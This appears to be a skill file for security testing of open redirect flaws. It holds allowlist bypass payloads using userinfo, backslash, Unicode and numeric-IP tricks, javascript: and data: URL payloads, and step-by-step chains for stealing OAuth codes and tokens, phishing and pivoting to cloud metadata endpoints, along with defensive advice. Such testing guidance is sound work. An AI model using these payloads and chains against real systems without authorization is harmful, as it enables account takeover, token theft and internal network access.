---
name: open-redirect
description: Open redirect testing for phishing pivots, OAuth token theft, and allowlist bypass
depends_on: []
---

# Open Redirect

Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist bypass in server-side fetchers that follow redirects. Treat every redirect target as untrusted: canonicalize and enforce exact allowlists per scheme, host, and path.

## Discovery Signals

| Signal | Where to Find | Why Vulnerable |
|---|---|---|
| OAuth/OIDC implementation | Feature scan | `redirect_uri` parameter manipulation for token theft |
| Login page with `next`/`returnTo` parameter | URL analysis | Post-login redirect to attacker site |
| SSO/SAML integration | Feature scan | `RelayState` parameter manipulation |
| Payment gateway redirect | Payment flow | Post-payment redirect to phishing page |
| Email verification link with redirect | Email content | Trusted domain URL redirecting to attacker |
| URL shortener or link redirector | Feature scan | `/r/`, `/out/`, `/go/`, `/link/` endpoints |
| Logout with `redirect` parameter | Feature scan | Post-logout redirect to credential phishing |
| Language/locale switcher with URL param | Feature scan | Often lacks validation on redirect target |
| Mobile deep link handler | Mobile app analysis | Custom scheme handler with URL parameter |
| `window.location` assignment from URL param | JS source | Client-side open redirect |
| File viewer / image proxy with URL param | Feature scan, source | Allowlisted-host URL fetcher leaks tokens on parser mismatch ($750K) |
| Markdown/WYSIWYG renderer for operators | Issue trackers, admin panels | Link-parser quirks enable phishing against privileged audiences ($10K) |
| Catch-all path on any host | Per-host probe | `<host>/http://evil.com/` trivial test per host ($1.2K) |
| Error page "go back" / "cancel" button | Error flows, modals | Destination derived from session/Referer, rarely validated ($560) |
| Link-safety interstitial (linkshim, safe links) | URL-shaped params on safety endpoints | Bypass displays trusted URL but navigates to attacker ($500) |

## Attack Surface

**Server-Driven Redirects**
- HTTP 3xx Location

**Client-Driven Redirects**
- `window.location`, meta refresh, SPA routers

**OAuth/OIDC/SAML Flows**
- `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `returnTo`/`continue`/`next`

**Multi-Hop Chains**
- Only first hop validated

## High-Value Targets

- Login/logout, password reset, SSO/OAuth flows
- Payment gateways, email links, invite/verification
- Unsubscribe, language/locale switches
- `/out` or `/r` redirectors

## Reconnaissance

### Injection Points

- Params: `redirect`, `url`, `next`, `return_to`, `returnUrl`, `continue`, `goto`, `target`, `callback`, `out`, `dest`, `back`, `to`, `r`, `u`
- OAuth/OIDC/SAML: `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `state`
- SPA: `router.push`/`replace`, `location.assign`/`href`, meta refresh, `window.open`
- Headers: `Host`, `X-Forwarded-Host`/`Proto`, `Referer`; server-side Location echo

### Parser Differentials

**Userinfo**
- `https://trusted.com@evil.com` → validators parse host as trusted.com, browser navigates to evil.com
- Variants: `trusted.com%40evil.com`, `a%40evil.com%40trusted.com`

**Backslash and Slashes**
- `https://trusted.com\evil.com`, `https://trusted.com\@evil.com`, `///evil.com`, `/\evil.com`

**Whitespace and Control**
- `http%09://evil.com`, `http%0A://evil.com`, `trusted.com%09evil.com`

**Fragment and Query**
- `trusted.com#@evil.com`, `trusted.com?//@evil.com`, `?next=//evil.com#@trusted.com`

**Unicode and IDNA**
- Punycode/IDN: `truѕted.com` (Cyrillic), `trusted.com。evil.com` (full-width dot), trailing dot

**Additional Parser-Confusion Patterns**

| Pattern | Example | Which Parsers Are Confused |
|---|---|---|
| Tab in scheme | `ht\ttp://evil.com` | Some regex validators |
| Newline in URL | `https://evil.com%0d%0a` | CRLF injection via redirect |
| Encoded @ | `https://trusted.com%40evil.com` | URL decode before/after parse difference |
| Dot followed by space | `https://evil.com .trusted.com` | Truncation at space |
| Semicolon as delimiter | `https://trusted.com;evil.com` | Java URI parser treats `;` as parameter |
| Double slash without scheme | `////evil.com` | Extra slashes collapsed differently |
| IPv6 bracket abuse | `https://[::evil.com]` | IPv6 bracket parsing |
| `0x` prefixed IP | `https://0xc0a80001` | Hex IP for `192.168.0.1` |

### Encoding Bypasses

- Double encoding: `%2f%2fevil.com`, `%252f%252fevil.com`
- Mixed case and scheme smuggling: `hTtPs://evil.com`, `http:evil.com`
- IP variants: decimal 2130706433, octal 0177.0.0.1, hex 0x7f.1, IPv6 `[::ffff:127.0.0.1]`
- User-controlled path bases: `/out?url=/\evil.com`

## Defense-Bypass Pairs

Specific defenses observed in the wild and the exact technique that defeated each:

| Defense | Bypass Technique | Real-World Example |
|---|---|---|
| Domain allowlist (string match) | Append attacker domain: `allowed.com.evil.com` | `redirect=https://target.com.attacker.com` |
| Domain allowlist (endsWith) | Subdomain of allowed: `evil-allowed.com` | `redirect=https://evil-target.com` |
| Regex without anchors | Match in path: `//evil.com/target.com` | `redirect=https://evil.com/path?ref=target.com` |
| Scheme allowlist (http/https only) | Use `//` protocol-relative: `//evil.com` | `next=//evil.com` |
| Path-only redirect (relative) | Break out with `//`: `redirect=//evil.com` | `return_to=//evil.com` |
| JavaScript-based validation | Timing race: set location before check completes | `location.href=userInput` before async validation |
| URL parsing with `new URL()` | Userinfo abuse: `https://trusted.com@evil.com` | JS `URL` parses host differently from browser |
| Referer check | Strip Referer with `<meta name="referrer" content="no-referrer">` | Referer-based redirect validation |
| Redirect only to same origin | Path confusion: `/\evil.com` or `/\/evil.com` | Backslash treated as path by validator, forward slash by browser |
| Base path check | Directory traversal: `/redirect?url=/../..//evil.com` | Path normalization difference |
| Blocklist of `evil.com` | IP address encoding: `http://2130706433` for `127.0.0.1` | Numeric IP bypasses domain blocklist |
| Host allowlist (file viewer) | Fragment confusion: `attacker.com#.trusted.com/path` | `endsWith('.trusted.com')` passes on fragment ($750K) |
| OAuth redirect to localhost | Chain: `localhost:8080/_ah/login?continue=attacker.com` | Desktop app OAuth + local open redirect leaks code via Referer ($50K) |
| Internal subdomain redirect chain | `internal.target.com/r?url=accounts.target.com/SetSID?continue=evil.com` | Chained internal redirects escape per-hop validation ($560) |
| Iframe `X-Frame-Options` on target | Path traversal in embed ID: `../signin` reaches frameable path | Embed ID traversal + redirect chain achieves same-origin iframe ($413K) |
| Markdown link validation | Userinfo trick: `[trusted.com](ftp://trusted.com@evil.com)` | Label/href divergence in renderer ($10K) |
| Unicode URL display filter | Cyrillic homoglyph: `truѕted.com` in display, `evil.com` in href | Display vs navigation mismatch ($560) |

## Payload Matrix by Context

| Context | Payload | Notes |
|---|---|---|
| Server-side redirect (3xx) | `https://evil.com`, `//evil.com`, `https://trusted.com@evil.com` | Try all three |
| Client-side (location.href) | `javascript:alert(1)`, `//evil.com`, `data:text/html,<script>` | JS context = XSS potential |
| Meta refresh | `0;url=https://evil.com` | Meta refresh in HTML |
| SPA router (React/Vue/Angular) | `/../..//evil.com`, `//evil.com`, absolute URL | Router.push with user input |
| OAuth redirect_uri | `https://trusted.com/callback/../../../@evil.com` | Path traversal in redirect_uri |
| URL parameter with path prefix | `/prefix/../..//evil.com`, `/prefix%2f..%2f../evil.com` | Escape the enforced prefix |

## Key Vulnerabilities

### Allowlist Evasion

**Common Mistakes**
- Substring/regex contains checks: allows `trusted.com.evil.com`
- Wildcards: `*.trusted.com` also matches `attacker.trusted.com.evil.net`
- Missing scheme pinning: `data:`, `javascript:`, `file:`, `gopher:` accepted
- Case/IDN drift between validator and browser

**Robust Validation**
- Canonicalize with a single modern URL parser (WHATWG URL)
- Compare exact scheme, hostname (post-IDNA), and an explicit allowlist with optional exact path prefixes
- Require absolute HTTPS; reject protocol-relative `//` and unknown schemes

### OAuth/OIDC/SAML

**Redirect URI Abuse**
- Using an open redirect on a trusted domain for redirect_uri enables code interception
- Weak prefix/suffix checks: `https://trusted.com` → `https://trusted.com.evil.com`
- Path traversal/canonicalization: `/oauth/../../@evil.com`
- `post_logout_redirect_uri` often less strictly validated

### Client-Side Vectors

**JavaScript Redirects**
- `location.href`/`assign`/`replace` using user input
- Meta refresh `content=0;url=USER_INPUT`
- SPA routers: `router.push(searchParams.get('next'))`

### Reverse Proxies and Gateways

- Host/X-Forwarded-* may change absolute URL construction
- CDNs that follow redirects for link checking can leak tokens when chained

### SSRF Chaining

- Server-side fetchers (web previewers, link unfurlers) follow 3xx
- Combine with an open redirect on an allowlisted domain to pivot to internal targets (169.254.169.254, localhost)

## Exploitation Scenarios

### OAuth Token Theft Chain (Authorization Code Flow)

This is the highest-payout open redirect chain pattern. Step-by-step:

1. Find open redirect on the OAuth client domain (e.g., `https://app.com/redirect?url=evil.com`)
2. Construct authorization URL: `https://auth-server.com/authorize?client_id=xxx&redirect_uri=https://app.com/redirect?url=evil.com&response_type=code&scope=openid`
3. Victim clicks link, authenticates, auth server redirects to `app.com/redirect?url=evil.com&code=AUTH_CODE`
4. `app.com` follows the redirect, sends victim to `evil.com` with `code=` in Referer or URL fragment
5. Attacker exchanges code for access token

### OAuth Token Theft Chain (Implicit Flow)

1. Same setup but `response_type=token`
2. Auth server redirects to `app.com/redirect?url=evil.com#access_token=xxx`
3. Fragment survives redirect, attacker page reads `location.hash`
4. Note: fragment preservation depends on redirect type (3xx preserves, JS `location.href` preserves)

**Key OAuth Tests**:
- Does the auth server enforce exact redirect_uri matching? Try: path traversal, query params, fragment, trailing slash
- Does `post_logout_redirect_uri` have weaker validation than `redirect_uri`? (Often yes)
- Is there a `state` parameter? If not, the entire OAuth flow is CSRF-vulnerable

### Phishing Flow

1. Send link on trusted domain: `/login?next=https://attacker.tld/fake`
2. Victim authenticates; browser navigates to attacker page
3. Capture credentials/tokens via cloned UI

### OAuth Code Theft via Desktop App Localhost Redirect ($50K)

1. Enumerate OAuth `client_id`s from desktop/mobile apps, IDE plugins, CLIs (grep binaries, GitHub repos, docs)
2. For each `client_id`, identify registered `redirect_uri`s -- localhost is common for desktop apps
3. Audit the localhost application for reflected redirect params (`continue=`, `next=`, `url=`)
4. Craft: `authorize?client_id=X&redirect_uri=http://localhost:8080/login?continue=evil.com&scope=SENSITIVE`
5. Victim consents, code lands in localhost URL, open redirect fires, code leaks via Referer header to attacker

### Token Leak via File Viewer Parser Mismatch ($750K)

1. Find any feature that fetches a user-supplied URL with the app's identity (file viewer, image proxy, OEmbed)
2. Identify if validator and fetcher use different parsers (common: validator = strict library, fetcher = loose URL builder)
3. Craft parser-disagreement URL: `trusted.com/attacker.com#.trusted.com/path` passes allowlist but fetches from attacker
4. If the app attaches `?access_token=` or cookies to outbound requests, the token leaks to attacker-controlled server

### Internal Evasion

1. Server-side link unfurler fetches `https://trusted.example/out?u=http://169.254.169.254/latest/meta-data`
2. Redirect follows to metadata; confirm via timing/headers

## Testing Methodology

1. **Inventory surfaces** - Login/logout, password reset, SSO/OAuth flows, payment gateways, email links
2. **Build test matrix** - Scheme x host x path variants and encoding/unicode forms
3. **Compare behaviors** - Server-side validation vs browser navigation results
4. **Multi-hop testing** - Trusted-domain to redirector to external
5. **Prove impact** - Credential phishing, OAuth code interception, internal egress

## Validation

1. Produce a minimal URL that navigates to an external domain via the vulnerable surface; include the full address bar capture
2. Show bypass of the stated validation (regex/allowlist) using canonicalization variants
3. Test multi-hop: prove only first hop is validated and second hop escapes constraints
4. For OAuth/SAML, demonstrate code/RelayState delivery to an attacker-controlled endpoint

## False Positives

- Redirects constrained to relative same-origin paths with robust normalization
- Exact pre-registered OAuth redirect_uri with strict verifier
- Validators using a single canonical parser and comparing post-IDNA host and scheme
- User prompts that show the exact final destination before navigating

## Impact

- Credential and token theft via phishing and OAuth/OIDC interception
- Internal data exposure when server fetchers follow redirects
- Policy bypass where allowlists are enforced only on the first hop
- Cross-application trust erosion and brand abuse

## Pro Tips

1. Always compare server-side canonicalization to real browser navigation; differences reveal bypasses
2. Try userinfo, protocol-relative, Unicode/IDN, and IP numeric variants early
3. In OAuth, prioritize `post_logout_redirect_uri` and less-discussed flows; they're often looser
4. Exercise multi-hop across distinct subdomains and paths
5. For SSRF chaining, target services known to follow redirects
6. Favor allowlists of exact origins plus optional path prefixes
7. Keep a curated suite of redirect payloads per runtime (Java, Node, Python, Go)
8. Test `post_logout_redirect_uri` FIRST -- it almost always has weaker validation than `redirect_uri` and pays the same bounty
9. Fragment (#) preservation is redirect-type dependent -- 3xx HTTP redirects preserve fragments, but `location.replace()` may not
10. Check for open redirect on ALL subdomains -- if `auth.example.com/redirect` is hardened but `blog.example.com/redirect` is not, and the OAuth allows `*.example.com`, that is the chain
11. Try `%0d%0a` in the redirect URL -- if the redirect value is placed in a `Location` header without encoding, you get CRLF injection (header injection) as a bonus finding
12. Test mobile deep link handlers -- custom URL scheme handlers (`myapp://`) often lack redirect validation entirely
13. Enumerate ALL OAuth `client_id`s for a target (desktop apps, IDE plugins, CLIs) -- localhost redirect_uri + local open redirect = code theft via Referer ($50K pattern)
14. For file viewers / image proxies / OEmbed: if validator != fetcher (different parser libs), craft parser-disagreement URLs -- the $750K Google VRP used fragment confusion to leak access tokens
15. Regression-test every disclosed fix -- re-test with encoding variants, whitespace injection, case changes within 48h of patch deploy ($560 repeat pattern)
16. Audit Markdown renderers used by privileged operators (triage teams, admins) for label/href divergence and protocol allowlist gaps -- `ftp://trusted@evil.com` in Markdown is a phishing chassis ($10K)
17. Test `<host>/http://evil.com/` on every host -- catch-all path redirectors cost one request per host to find ($1.2K)
18. Audit error page "go back" and "cancel" buttons -- destinations derived from Referer or session state are rarely validated ($560)
19. For any auto-fill/pre-fill parameter on share/invite dialogs (`?userstoinvite=`, `?to=`, `?email=`), combine with same-origin iframe via redirect chain for one-click UI redress ($413K)

## Summary

Redirection is safe only when the final destination is constrained after canonicalization. Enforce exact origins, verify per hop, and treat client-provided destinations as untrusted across every stack.
